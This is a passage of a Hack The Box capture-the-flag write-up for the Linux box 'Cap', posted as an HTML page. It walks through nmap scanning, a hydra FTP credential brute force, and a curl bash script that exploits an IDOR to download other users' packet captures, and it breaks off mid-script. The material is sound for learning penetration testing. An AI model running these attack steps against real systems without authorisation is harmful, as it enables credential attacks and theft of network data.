@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Linux box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;cap#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Cap<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2024-01-21</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/cap/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#host-10-10-10-245">Host 10.10.10.245</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#ftp">FTP</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#gunicorn">Gunicorn</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#ftp-1">FTP</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#foothold-ssh">Foothold (SSH)</a>
+                                </li>
+
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#distribution">Distribution</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#kernel">Kernel</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#nics">NICs</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#hostname">Hostname</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#flags">Flags</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#website-code-review">Website code review</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#inspecting-app-py-and-usr-bin-python3">Inspecting app.py and &#x2F;usr&#x2F;bin&#x2F;python3</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#privilege-escalation-capabilities">Privilege escalation (Capabilities)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#establishing-persistence">Establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#system-enumeration-1">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#flags-1">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/cap/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2021-06-05</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/52045">InfoSecJack</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.4</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-10-245">Host <code>10.10.10.245</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Cap using a TCP SYN <code>nmap</code>
+scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.245<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">21/tcp open  ftp
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.245<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE  SERVICE
+</span><span class="z-text z-plain">22/udp  closed ssh
+</span><span class="z-text z-plain">139/udp closed netbios-ssn
+</span><span class="z-text z-plain">445/udp closed microsoft-ds
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.245<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>21,22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
+</span><span class="z-text z-plain">21/tcp open  ftp     vsftpd 3.0.3
+</span><span class="z-text z-plain">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+</span><span class="z-text z-plain">80/tcp open  http    gunicorn
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Cap is running Linux, and the
+version of SSH suggests that it might be Ubuntu.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.245<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>21,22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">21/tcp open  ftp
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+</span><span class="z-text z-plain">|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+</span><span class="z-text z-plain">|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Security Dashboard
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="ftp">FTP</h3>
+<h4 id="exploring-the-filesystem">Exploring the filesystem</h4>
+<p><code>nmap</code>'s scripts didn't detect that anonymous login is allowed. If we try, we
+see that it indeed fails.</p>
+<p>Let's use <code>hydra</code> with
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt">this wordlist</a>
+to try common FTP credentials.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> hydra<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>C</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.245<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>ftp<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">1 of 1 target completed, 0 valid password found
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It failed too.</p>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>We can't connect to the FTP server. But maybe it's vulnerable to known exploits?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.245<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>21<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>script</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>vuln<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">21/tcp open  ftp
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It isn't.</p>
+<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>vsftpd 3.0.3</code>, we
+only find a DOS vulnerability.</p>
+<h3 id="gunicorn">Gunicorn</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://10.10.10.245/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/cap/gunicorn-homepage.png" alt="Gunicorn homepage" /></p>
+<p>We are served a dashboard with various security metrics.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/cap/gunicorn-homepage-wappalyzer.png" alt="Gunicorn homepage Wappalyzer extension" /></p>
+<p>This reveals that this web page is using Python.</p>
+<p>Moreover, the footer of the website leaks that it's using a template made by
+<a href="https://colorlib.com/">Colorlib</a>.</p>
+<h4 id="exploration-1">Exploration</h4>
+<p>Let's browse to the web pages linked on the sidebar.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/cap/gunicorn-data-page.png" alt="Gunicorn '/data' homepage" /></p>
+<p>The <code>/capture</code> page redirects us to <code>/data/1</code> after 5 seconds, and saves all the
+connections received within this timeframe into a <code>.pcap</code> file. It then displays
+various information about it, and gives us to possibility to download it.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/cap/gunicorn-ip-page.png" alt="Gunicorn '/ip' page" /></p>
+<p>The <code>/ip</code> page shows the output of what looks like the <code>ifconfig</code> Linux command.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/cap/gunicorn-netstat-page.png" alt="Gunicorn '/netstat' homepage" /></p>
+<p>The <code>/netstat</code> page shows the output of what looks like the <code>netstat</code> Linux command.</p>
+<h4 id="under-the-hood">Under the hood</h4>
+<p>If we check the previous requests using Burp Suite, we notice that when we
+request the <code>/capture</code> page, there's a 5 seconds delay before being redirected
+to <code>/data/1</code>.</p>
+<p>On this web page, if we ask to download the PCAP file, we send a GET request
+to <code>/download/1</code>.</p>
+<h4 id="idor">IDOR</h4>
+<p>When we initiate a request for the network sniffing capture, it's assigned a
+unique number. This assigned number is subsequently utilized for downloading the
+corresponding PCAP file.</p>
+<p>Upon making successive requests, it becomes apparent that the assigned number is
+incremented by one every time.</p>
+<p>There's likely an IDOR here, which would allow us to download previous captures!</p>
+<h4 id="downloading-previous-captures">Downloading previous captures</h4>
+<p>Let's use a Bash script to request all captures from number <code>0</code> to <code>99</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">!/bin/bash</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Define the target URL</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-variable z-other z-readwrite z-assignment z-shell">url</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.245/download/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Specify the output directory</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-variable z-other z-readwrite z-assignment z-shell">output_directory</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/pcaps/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Create the directory if it doesn&#39;t exist</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mkdir</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">output_directory</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Loop through numbers 0 to 99</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-loop z-for z-shell">for</span><span class="z-meta z-group z-for z-shell"> number <span class="z-keyword z-control z-in z-shell">in</span> <span class="z-meta z-group z-expansion z-brace z-shell"><span class="z-punctuation z-section z-expansion z-brace z-begin z-shell">{</span>0..99<span class="z-punctuation z-section z-expansion z-brace z-end z-shell">}</span></span></span>
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-loop z-do z-shell">do</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Use curl to check if the URL returns HTTP status code 404</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">    <span class="z-variable z-other z-readwrite z-assignment z-shell">http_status</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">curl</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>%{http_code}<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">url</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-expansion z-parameter z-begin z-shell">{</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-variable z-other z-readwrite z-shell">number</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-section z-expansion z-parameter z-end z-shell">}</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash">    <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Check if the HTTP status code is 404 (Not Found)</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">    <span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-support z-function z-test z-begin z-shell">[</span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">http_status</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>ne</span> 404 <span class="z-support z-function z-test z-end z-shell">]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Download the corresponding PCAP file only if not a 404 response</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">curl</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-expansion z-parameter z-begin z-shell">{</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-variable z-other z-readwrite z-shell">output_directory</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-section z-expansion z-parameter z-end z-shell">}</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-expansion z-parameter z-begin z-shell">{</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-variable z-other z-readwrite z-shell">number</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-section z-expansion z-parameter 